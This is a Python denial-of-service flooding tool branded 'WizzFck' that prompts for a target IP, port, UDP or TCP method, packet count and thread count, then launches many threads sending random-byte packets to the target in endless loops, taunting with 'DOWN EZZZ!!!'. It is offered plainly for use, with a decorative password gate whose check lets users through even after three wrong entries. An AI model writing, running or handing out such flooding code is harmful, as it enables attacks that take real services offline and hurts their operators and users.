import random
import socket
import threading
import os
import sys
import time
from time import sleep
from rich.console import Console

os.system("clear")
console = Console()
tasks = [f"Loading To Tools Second {n}" for n in range(1, 11)]

with console.status("[bold green]Working on Tools...") as status:
    while tasks:
        task = tasks.pop(0)
        sleep(1)
        console.log(f"{task} wizzfcktools")
#login tools
password ="wizzfck"

print("""\u001b[35m
Login To Tools
""")
for i in range(3):
	pwd = input("\u001b[37m[+] Enter Password  : ")
	j=3
	if(pwd==password):
		time.sleep(5)
		print("[!] Please Security To Password!!! ")
		break
	else:
		time.sleep(5)
		print("\u001b[31m[×] Wrong IS Security Password!!! ")
		continue
time.sleep(5)
print("\u001b[35m{√} Successfully Loginned")
time.sleep(2)

os.system("clear")
print(" \033[95m WizzFck")
print("\033[0m")
print(""" \033[96m
                 \033[34m╦ ╦╦╔═╗╔═╗\033[33m╦  ╦╦╔═╗
                 \033[34m║║║║╔═╝╔═╝\033[33m╚╗╔╝║╠═╝
                 \033[34m╚╩╝╩╚═╝╚═╝\033[33m ╚╝ ╩╩  
""")
print("\033[0m")


ip = str(input("\033[94m Host/Ip Target:"))
port = int(input("\033[0m\033[94m Port Target:"))
methods = str(input("\033[0m\033[94m Method | UDP / TCP |:"))
times = int(input("\033[0m\033[94m Paket :"))
threads = int(input("\033[0m\033[94m Threads:"))

os.system("clear")
def run():
	data = random._urandom(666)
	i = random.choice(("[×]","[×]","[×]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +"\033[94m TARGET IP:\033[0m%s\033[94m TARGET PORT:\033[0m%s \033[91mMETHODS:\033[0m%s \033[92mTHREADS:\033[0m%s"%(ip,port,methods,threads))
		except:
			print("\033[92m DOWN EZZZ!!!")

def run2():
	data = random._urandom(818)
	i = random.choice(("[×]","[×]","[×]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"\033[94m TARGET IP:\033[0m%s\033[94m TARGET PORT:\033[0m%s \033[91mMETHODS:\033[0m%s \033[92mTHREADS:\033[0m%s"%(ip,port,methods,threads))
		except:
			s.close()
			print("\033[92m DOWN GAK TUUH!!!")

def run3():
	data = random._urandom(888)
	i = random.choice(("[×]","[×]","[×]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"\033[94m TARGET IP:\033[0m%s\033[94m TARGET PORT:\033[0m%s \033[91mMETHODS:\033[0m%s \033[92mTHREADS:\033[0m%s"%(ip,port,methods,threads))
		except:
			s.close()
			print("\033[92m DOWN GAK TUUH!!!")


for udp in range(threads):
	if methods == 'UDP':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()   
 
for y in range(threads):
  if methods == 'TCP':
    th = threading.Thread(target = run3)
    th.start()